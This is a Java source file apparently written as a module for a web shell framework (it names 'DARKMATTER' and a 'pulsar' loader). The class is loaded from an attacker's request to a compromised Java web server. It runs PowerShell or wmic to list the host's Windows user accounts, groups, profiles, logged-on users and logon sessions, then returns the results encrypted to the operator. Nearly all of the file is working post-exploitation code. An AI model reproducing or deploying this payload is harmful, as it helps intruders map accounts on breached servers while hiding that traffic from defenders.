import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.*;
public class win_user extends ClassLoader
{
    public win_user(ClassLoader objParent) { super(objParent); }
    public win_user() { super(win_user.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuffer sb = new StringBuffer();

            Map<String, Object> result = new LinkedHashMap<>();
            result.put("success", false);
            result.put("error", "");
            result.put("data", null);

            try
            {
                Map<String, List<Map<String, String>>> data = new LinkedHashMap<>();
                data.put("user_accounts", fnGetData("Get-CimInstance Win32_UserAccount | Format-List *", "Win32_UserAccount"));
                data.put("user_profiles", fnGetData("Get-CimInstance Win32_UserProfile | Format-List *", "Win32_UserProfile"));
                data.put("groups",         fnGetData("Get-CimInstance Win32_Group | Format-List *", "Win32_Group"));
                data.put("group_users",    fnGetData("Get-CimInstance Win32_GroupUser | Format-List *", "Win32_GroupUser"));
                data.put("logged_on",     fnGetData("Get-CimInstance Win32_LoggedOnUser | Format-List *", "Win32_LoggedOnUser"));
                data.put("logon_session", fnGetData("Get-CimInstance Win32_LogonSession | Format-List *", "Win32_LogonSession"));

                result.put("data", data);
                result.put("success", true);
            }
            catch (Exception ex)
            {
                result.put("error", ex.getMessage());
            }

            sb.append(fnToJson(result, 0));

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    private boolean fnHasPowerShell()
    {
        try
        {
            Process proc = new ProcessBuilder("powershell", "-Command", "\"Get-Host\"").start();
            return proc.waitFor() == 0;
        }
        catch (Exception ex)
        {
            return false;
        }
    }

    private String fnCleanValue(String v)
    {
        if (v == null)
            return "";

        return v.replaceAll("[\\p{Cntrl}&&[^\\s]]", "").trim();
    }

    private List<Map<String, String>> fnGetData(String psQuery, String wmicClass) {
        if (fnHasPowerShell()) {
            List<Map<String, String>> psData = fnRunPowerShell(psQuery);
            if (!psData.isEmpty()) {
                return psData;
            }
        }
        return fnParseWMIC(wmicClass);
    }

    private List<Map<String, String>> fnRunPowerShell(String query) {
        List<Map<String, String>> rows = new ArrayList<>();
        Map<String, String> current = new TreeMap<>();

        try {
            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-Command", query);
            Process process = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.replace("\uFEFF", "").trim();

                    if (line.isEmpty()) {
                        if (!current.isEmpty()) {
                            rows.add(new LinkedHashMap<>(current));
                            current.clear();
                        }
                        continue;
                    }

                    if (!line.contains(":")) {
                        continue;
                    }

                    String[] parts = line.split(":", 2);
                    String k = fnCleanValue(parts[0]);
                    String v = parts.length > 1 ? fnCleanValue(parts[1]) : "";

                    if (k.isEmpty()) continue;
                    current.put(k, v);
                }
            }
            if (!current.isEmpty()) {
                rows.add(new LinkedHashMap<>(current));
            }
            process.waitFor();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return rows;
    }

    private List<Map<String, String>> fnParseWMIC(String wmicClass) {
        List<Map<String, String>> rows = new ArrayList<>();
        Map<String, String> current = new TreeMap<>();

        try {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", String.format("wmic path %s get /format:list", wmicClass));
            Process process = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "MS950"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.replace("\uFEFF", "").trim();

                    if (line.isEmpty()) {
                        if (!current.isEmpty()) {
                            rows.add(new LinkedHashMap<>(current));
                            current.clear();
                        }
                        continue;
                    }

                    if (!line.contains("=")) {
                        continue;
                    }

                    String[] parts = line.split("=", 2);
                    String k = fnCleanValue(parts[0]);
                    String v = parts.length > 1 ? fnCleanValue(parts[1]) : "";

                    if (k.isEmpty()) continue;
                    current.put(k, v);
                }
            }

            if (!current.isEmpty()) {
                rows.add(new LinkedHashMap<>(current));
            }
            process.waitFor();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return rows;
    }

    private String fnToJson(Object obj, int indentLevel) {
        String indent = "  ".repeat(indentLevel);
        String nextIndent = "  ".repeat(indentLevel + 1);

        if (obj == null) {
            return "null";
        }
        if (obj instanceof Boolean) {
            return obj.toString();
        }
        if (obj instanceof String) {
            return "\"" + fnEscapeJsonString((String) obj) + "\"";
        }
        if (obj instanceof Map) {
            Map<?, ?> map = (Map<?, ?>) obj;
            if (map.isEmpty()) return "{}";
            
            StringBuilder sb = new StringBuilder("{\n");
            Iterator<? extends Map.Entry<?, ?>> it = map.entrySet().iterator();
            while (it.hasNext()) {
                Map.Entry<?, ?> entry = it.next();
                sb.append(nextIndent)
                  .append("\"").append(fnEscapeJsonString(entry.getKey().toString())).append("\": ")
                  .append(fnToJson(entry.getValue(), indentLevel + 1));
                if (it.hasNext()) {
                    sb.append(",");
                }
                sb.append("\n");
            }
            sb.append(indent).append("}");
            return sb.toString();
        }
        if (obj instanceof List) {
            List<?> list = (List<?>) obj;
            if (list.isEmpty()) return "[]";

            StringBuilder sb = new StringBuilder("[\n");
            Iterator<?> it = list.iterator();
            while (it.hasNext()) {
                Object item = it.next();
                sb.append(nextIndent).append(fnToJson(item, indentLevel + 1));
                if (it.hasNext()) {
                    sb.append(",");
                }
                sb.append("\n");
            }
            sb.append(indent).append("]");
            return sb.toString();
        }

        return "\"" + fnEscapeJsonString(obj.toString()) + "\"";
    }

    private String fnEscapeJsonString(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\b", "\\b")
                  .replace("\f", "\\f")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }
}